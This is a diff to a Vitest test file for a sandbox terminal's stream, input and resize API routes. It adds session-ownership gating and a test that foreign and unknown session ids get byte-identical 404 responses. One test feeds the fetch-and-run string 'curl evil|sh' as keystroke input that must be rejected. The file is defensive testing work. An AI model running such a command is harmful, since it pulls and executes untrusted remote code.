@@ -1,8 +1,13 @@
 /**
  * The three sandbox-terminal routes (#79): stream (SSE out), input and resize
  * (control in). The PtyManager is mocked — these cases are about the HTTP
- * surface the xterm client talks to: auth, argument validation, the scrollback
+ * surface the xterm client talks to: auth, ownership (a foreign session is
+ * indistinguishable from an absent one), argument validation, the scrollback
  * replay that repaints a re-mounted tab, and unsubscribing when the tab closes.
+ *
+ * The ownership *resolvers* are mocked; the gate logic on top of them
+ * (`lib/stash/http.server.ts` — claim on stream, verify on input/resize, 404
+ * shape) runs for real.
  */
 
 import { describe, it, expect, vi, beforeEach } from 'vitest'
@@ -10,6 +15,15 @@ import { describe, it, expect, vi, beforeEach } from 'vitest'
 vi.mock('../../../lib/harness-patterns/assert.server', () => ({
   assertServerOnImport: vi.fn(),
   assertServer: vi.fn(),
+}))
+
+const userOwnsSession = vi.fn<(sid: string, uid: string) => Promise<boolean>>(async () => true)
+const claimSessionOwnership = vi.fn<(sid: string, uid: string) => Promise<boolean>>(
+  async () => true,
+)
+vi.mock('../../../lib/stash/ownership.server', () => ({
+  userOwnsSession: (...a: unknown[]) => userOwnsSession(...(a as [string, string])),
+  claimSessionOwnership: (...a: unknown[]) => claimSessionOwnership(...(a as [string, string])),
 }))
 
 const ensure = vi.fn<(sid: string, opts?: { syncWorkspace?: boolean }) => Promise<void>>(
@@ -40,7 +54,10 @@ vi.mock('../../../lib/harness-client/registry.server', () => ({
 const getAuthenticatedUser = vi.fn<() => Promise<{ id: string }>>()
 vi.mock('../../../lib/auth/server', () => ({ getAuthenticatedUser }))
 let bypass = false
-vi.mock('../../../lib/auth/dev-bypass', () => ({ isBypassEnabled: () => bypass }))
+vi.mock('../../../lib/auth/dev-bypass', () => ({
+  isBypassEnabled: () => bypass,
+  BYPASS_USER: { id: 'bypass-user', email: 'bypass@example.com' },
+}))
 
 const stream = await import('../../../routes/api/sandbox/pty/stream')
 const input = await import('../../../routes/api/sandbox/pty/input')
@@ -81,6 +98,8 @@ beforeEach(() => {
   getScrollback.mockReturnValue(undefined)
   subscribe.mockReturnValue(unsubscribe)
   agentUsesSyncWorkspace.mockResolvedValue(false)
+  userOwnsSession.mockResolvedValue(true)
+  claimSessionOwnership.mockResolvedValue(true)
 })
 
 describe('GET /api/sandbox/pty/stream', () => {
@@ -95,8 +114,25 @@ describe('GET /api/sandbox/pty/stream', () => {
     getAuthenticatedUser.mockRejectedValue(new Error('Authentication required'))
     const res = await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=s1'))
     expect(res.status).toBe(401)
-    expect(await res.text()).toBe('Authentication required')
+    expect(await res.json()).toEqual({ error: 'Authentication required' })
     expect(ensure).not.toHaveBeenCalled()
+  })
+
+  it("404s another user's session without booting or subscribing to its PTY", async () => {
+    claimSessionOwnership.mockResolvedValue(false) // held by someone else
+    const res = await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=s1'))
+    expect(res.status).toBe(404)
+    expect(claimSessionOwnership).toHaveBeenCalledWith('s1', 'user-1')
+    expect(ensure).not.toHaveBeenCalled()
+    expect(subscribe).not.toHaveBeenCalled()
+    expect(getScrollback).not.toHaveBeenCalled()
+  })
+
+  it('claims an unclaimed session for the caller before booting its PTY', async () => {
+    const res = await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=fresh'))
+    expect(res.status).toBe(200)
+    expect(claimSessionOwnership).toHaveBeenCalledWith('fresh', 'user-1')
+    expect(ensure).toHaveBeenCalledWith('fresh', { syncWorkspace: false })
   })
 
   it('500s with the reason when the sandbox terminal fails to start', async () => {
@@ -149,11 +185,12 @@ describe('GET /api/sandbox/pty/stream', () => {
     expect(unsubscribe).toHaveBeenCalledTimes(1)
   })
 
-  it('skips the auth check under dev-bypass', async () => {
+  it('skips the auth check under dev-bypass, but still gates on ownership', async () => {
     bypass = true
     const res = await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=s1'))
     expect(res.status).toBe(200)
     expect(getAuthenticatedUser).not.toHaveBeenCalled()
+    expect(claimSessionOwnership).toHaveBeenCalledWith('s1', 'bypass-user')
   })
 })
 
@@ -182,6 +219,14 @@ describe('POST /api/sandbox/pty/input', () => {
     expect((await input.POST(post('http://x/i', { sessionId: 's1', data: '' }))).status).toBe(204)
     expect(write).toHaveBeenCalledWith('s1', '')
   })
+
+  it("404s another user's session and writes no keystrokes into its shell", async () => {
+    userOwnsSession.mockResolvedValue(false)
+    const res = await input.POST(post('http://x/i', { sessionId: 's1', data: 'curl evil|sh\n' }))
+    expect(res.status).toBe(404)
+    expect(userOwnsSession).toHaveBeenCalledWith('s1', 'user-1')
+    expect(write).not.toHaveBeenCalled()
+  })
 })
 
 describe('POST /api/sandbox/pty/resize', () => {
@@ -208,5 +253,39 @@ describe('POST /api/sandbox/pty/resize', () => {
         .status,
     ).toBe(400)
     expect(resize).not.toHaveBeenCalled()
+  })
+
+  it("404s another user's session and never touches its PTY", async () => {
+    userOwnsSession.mockResolvedValue(false)
+    const res = await resizeRoute.POST(post('http://x/r', { sessionId: 's1', cols: 80, rows: 24 }))
+    expect(res.status).toBe(404)
+    expect(userOwnsSession).toHaveBeenCalledWith('s1', 'user-1')
+    expect(resize).not.toHaveBeenCalled()
+  })
+})
+
+describe('ownership 404s are indistinguishable from an absent session', () => {
+  // `userOwnsSession(unknown)` resolves null-owner → false, the same value a
+  // foreign session yields, so both go down one code path. Pin that the
+  // response bodies are byte-identical anyway, per route, so a refactor that
+  // splits the two cases can't quietly start leaking which ids exist.
+  it('input, resize and stream return one identical 404 for both cases', async () => {
+    userOwnsSession.mockResolvedValue(false)
+    claimSessionOwnership.mockResolvedValue(false)
+    const foreign = [
+      await input.POST(post('http://x/i', { sessionId: 'foreign', data: 'x' })),
+      await resizeRoute.POST(post('http://x/r', { sessionId: 'foreign', cols: 80, rows: 24 })),
+      await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=foreign')),
+    ]
+    const unknown = [
+      await input.POST(post('http://x/i', { sessionId: 'nope', data: 'x' })),
+      await resizeRoute.POST(post('http://x/r', { sessionId: 'nope', cols: 80, rows: 24 })),
+      await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=nope')),
+    ]
+    for (let i = 0; i < foreign.length; i++) {
+      expect(foreign[i].status).toBe(404)
+      expect(unknown[i].status).toBe(404)
+      expect(await foreign[i].text()).toBe(await unknown[i].text())
+    }
   })
 })
